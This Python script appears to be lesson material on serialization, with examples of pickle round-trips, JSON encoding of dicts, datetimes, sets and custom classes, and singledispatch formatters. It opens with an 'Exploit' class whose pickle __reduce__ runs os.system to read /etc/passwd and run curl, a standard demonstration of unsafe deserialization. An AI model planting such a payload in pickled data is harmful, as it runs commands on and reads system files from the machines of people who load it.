import os
import pickle


class Exploit():
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))


def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)

ser = pickle.dumps(3.14)
deser = pickle.loads(ser)
print(deser)


d1 = {'a': 1, 'b': 2}
d2 = {'x': 10, 'y': d1}
d1_ser = pickle.dumps(d1)
d2_ser = pickle.dumps(d2)

del d1
del d2

d1 = pickle.loads(d1_ser)
d2 = pickle.loads(d2_ser)


print(d1)
print(d2)
d1['c'] = 3
print(d1)
print(d2)

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __eq__(self, other):
        return self.name == other.name and self.age == other.age
    
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'

john = Person('John Smith', 79)
eric = Person('Eric Doe', 75)
michael = Person('Michael Black', 75)

parrot_sketch = {
    "title": "Parrot Sketch",
    "actors": [john, michael]
}

ministry_sketch = {
    "title": "Ministry of Silly Walks",
    "actors": [john, michael]
}

joke_sketch = {
    "title": "Funniest Joke in the World",
    "actors": [eric, michael]
}

fan_favorites = {
    "user_1": [parrot_sketch, joke_sketch],
    "user_2": [parrot_sketch, ministry_sketch]
}

from pprint import pprint
pprint(fan_favorites)


import json

d_json = '''
{
    "name": "John Smith",
    "age": 82,
    "height": 1.96,
    "walksFunny": true,
    "sketches": [
        {
        "title": "Dead Parrot",
        "costars": ["Michael Black"]
        },
        {
        "title": "Ministry of Silly Walks",
        "costars": ["Michael Black", "Terry Crews"]
        }
    ],
    "boring": null    
}
'''

d = json.loads(d_json)
print(d)

print(d['age'], type(d['age']))
print(d['height'], type(d['height']))
print(d['boring'], type(d['boring']))
print(d['sketches'], type(d['sketches']))
print(d['walksFunny'], type(d['walksFunny']))
print(d['sketches'][0], type(d['sketches'][0]))

from decimal import Decimal
json.dumps({'a': Decimal('0.5')})

try:
    json.dumps({"a": 1+1j})
except TypeError as ex:
    print(ex)

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return dict(name=self.name, age=self.age)

p = Person('John', 82)
json.dumps({"john": p})

print(json.dumps({"john": p.toJSON()}, indent=2))


from datetime import datetime
import json

current = datetime.utcnow()
print(current)
json.dumps(current)
log_record = {'time': datetime.utcnow().isoformat(), 'message': 'testing'}
json.dumps(log_record)

def format_iso(dt):
    return dt.isoformat()

json.dumps(log_record, default=format_iso)

log_record1 = {
    'time1': datetime.utcnow(),
    'time2': datetime.utcnow(),
    'message': 'Testing...'
}

json.dumps(log_record1, default=format_iso)

log_record2 = {
    'time': datetime.utcnow(),
    'message': 'Testing...',
    'other': {'a', 'b', 'c'}
}

json.dumps(log_record2, default=format_iso)

class Person2:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.create_dt = datetime.utcnow()
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return {
            'name': self.name,
            'age': self.age,
            'create_dt': self.create_dt.isoformat()
        }

p1 = Person2('John', 82)
print(p)
print(p.toJSON())

def custom_json_formatter(arg):
    if isinstance(arg, datetime):
        return arg.isoformat()
    elif isinstance(arg, set):
        return list(arg)
    elif isinstance(arg, Person2):
        return arg.toJSON()

log_record3 = dict(time=datetime.utcnow(),
                  message='Created new person record',
                  person=p1)

print(json.dumps(log_record3, default=custom_json_formatter, indent=2))

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        
    def __repr__(self):
        return f'Point(x={self.x}, y={self.y})'

pt1 = Point(10, 10)
log_record4 = dict(time=datetime.utcnow(),
                  message='Created new point',
                  point=pt1,
                  created_by=p)

print(json.dumps(log_record4, default=custom_json_formatter, indent=2))

from functools import singledispatch
@singledispatch
def json_format(arg):
    print(arg)
    try:
        print('\ttrying to use toJSON...')
        return arg.toJSON()
    except AttributeError:
        print('\tfailed - trying to use vars...')
        try:
            return vars(arg)
        except TypeError:
            print('\tfailed - using string representation...')
            return str(arg)

@json_format.register(datetime)
def _(arg):
    return arg.isoformat()

@json_format.register(set)
def _(arg):
    return list(arg)

print(json.dumps(log_record4, default=json_format, indent=2))



